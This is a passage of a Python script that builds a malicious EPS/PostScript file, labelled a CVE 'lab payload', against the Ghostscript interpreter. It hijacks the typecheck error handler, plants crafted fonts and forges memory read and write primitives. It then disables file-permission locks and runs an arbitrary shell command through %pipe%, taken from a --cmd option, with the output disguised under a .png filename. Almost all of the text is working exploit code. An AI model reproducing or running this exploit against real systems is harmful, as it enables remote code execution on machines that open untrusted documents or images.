PRELUDE = b"""false setglobal
count array astore
dup 7 userdict /PlantArray get put
aload pop
true setglobal
"""

PS_TEMPLATE = r"""%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: 0 0 1 1
% CVE-2026-125396 lab payload: id > /tmp/PWN
/PlantArray 1 array def
/OrigTc errordict /typecheck get def
/TrapPhase false def
errordict /typecheck {
  userdict /TrapPhase known { userdict /TrapPhase get } { false } ifelse {
    userdict /TrapPhase false put
    pop pop pop pop pop
    userdict /ForceTarget get userdict /ForceKey get userdict /ForceValue get
  } { OrigTc } ifelse
} put
/Hdr 8 array def
/Cands 16384 array def
/Idx 0 def /J 0 def /A 0 def /E 0 def /HitA -1 def /HitE -1 def /Found -1 def
/Dang null def /S null def /Tmp 0 def /Off 0 def /Str null def
/Len 0 def /Addr 0 def /PSELF 0 def /Val 0 def
/P0 0 def /P1 0 def /P2 0 def /P3 0 def /P4 0 def /V 0 def
/rdstr8 { /Off exch def /Str exch def /Tmp 0 def 7 -1 0 { /J exch def /Tmp Tmp 256 mul Str Off J add get add def } for Tmp } bind def
/forge { /Len exch def /Addr exch def 0 1 3 { /J exch def Dang J Hdr J get put } for 0 1 3 { /J exch def Dang J 4 add Len 255 and put /Len Len 256 idiv def } for 0 1 7 { /J exch def Dang J 8 add Addr 255 and put /Addr Addr 256 idiv def } for } bind def
/rd4 { /Addr exch def Addr 4 forge /S A E get def /Tmp 0 def 3 -1 0 { /J exch def /Tmp Tmp 256 mul S J get add def } for A E 0 put S null def Tmp } bind def
/rd8 { /Addr exch def Addr 8 forge /S A E get def /Tmp 0 def 7 -1 0 { /J exch def /Tmp Tmp 256 mul S J get add def } for A E 0 put S null def Tmp } bind def
/wr4 { /Val exch def /Addr exch def Addr 4 forge /S A E get def 0 1 3 { /J exch def S J Val 255 and put /Val Val 256 idiv def } for A E 0 put S null def } bind def
/fontsrc1 @@HEX1@@ def
/fontsrc2 @@HEX2@@ def
(%ram%evil.pfa) (w) file dup fontsrc1 writestring closefile
(%ram%evil2.pfa) (w) file dup fontsrc2 writestring closefile
{ /EvilFont (%ram%evil.pfa) .definefontmap } stopped pop
{ /EvilFont2 (%ram%evil2.pfa) .definefontmap } stopped pop
userdict /ForceTarget currentuserparams put
userdict /ForceKey /LockFilePermissions put
userdict /ForceValue false put
userdict /TrapPhase true put
{ /EvilFont2 findfont pop } stopped pop
/S save def
userdict /ForceTarget systemdict put
userdict /ForceKey /GS_DANGLE_STR put
userdict /ForceValue 2048 string put
userdict /ForceValue get 0 16#41 put
userdict /TrapPhase true put
{ /EvilFont findfont pop } stopped pop
S restore
0 1 16383 { /Idx exch def 8 array 0 1 7 { /J exch def dup J 305419896 put } for Cands Idx 3 -1 roll put } for
/Dang systemdict /GS_DANGLE_STR get def
0 1 2044 { /Off exch def Dang Off get 16#78 eq Dang Off 1 add get 16#56 eq and Dang Off 2 add get 16#34 eq and Dang Off 3 add get 16#12 eq and { Off /Found exch def exit } if } for
Found 0 lt { quit } if
Dang Found 16#79 put
0 1 16383 { /Idx exch def Cands Idx get /A exch def 0 1 7 { /J exch def A J get 305419897 eq { Idx /HitA exch def J /HitE exch def } if } for } for
Cands HitA get HitE Dang put
0 1 7 { /J exch def Hdr J Dang J get put } for
/PSELF Dang 8 rdstr8 def
Cands HitA get HitE 0 put
/A Cands HitA get def /E HitE def
A E currentdevice put
/P0 Dang 8 rdstr8 def
A E 0 put
/P1 P0 rd8 def
/P2 P1 24 add rd8 def
/P3 P2 208 add rd8 def
/P4 P3 8 add rd8 def
/V P4 156 add rd4 def
V 1 eq {
  P4 156 add 0 wr4
  (%pipe%@@CMD@@) (w) file closefile
} if
quit
"""


def font_bytes(name):
    pfa = zlib.decompress(base64.b64decode(FONT_PFA_ZB64))
    old = b'/FontName /NimbusSans-Regular def'
    if old not in pfa:
        raise SystemExit('unexpected PFA layout')
    return PRELUDE + pfa.replace(old, b'/FontName /' + name + b' def')


def hexlit(data):
    h = data.hex()
    return '<' + '\n'.join(h[i:i + 120] for i in range(0, len(h), 120)) + '>'


def ps_escape(s):
    return (s.replace('\\', '\\\\')
             .replace('(', '\\(')
             .replace(')', '\\)')
             .replace('\r', ' ')
             .replace('\n', ' '))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--out', default='fuzz.png',
                    help='output path (EPS/PS content; default fuzz.png)')
    ap.add_argument('--cmd', default='id > /tmp/PWN 2>&1',
                    help='command executed via %%pipe%% (default: id > /tmp/PWN 2>&1)')
    args = ap.parse_args()
    ps = (PS_TEMPLATE
          .replace('@@HEX1@@', hexlit(font_bytes(b'EvilFont')))
          .replace('@@HEX2@@', hexlit(font_bytes(b'EvilFont2')))
          .replace('@@CMD@@', ps_escape(args.cmd)))
    pathlib.Path(args.out).write_text(ps)
    print(f'wrote {args.out} ({len(ps)} bytes)')


if __name__ == '__main__':
    main()
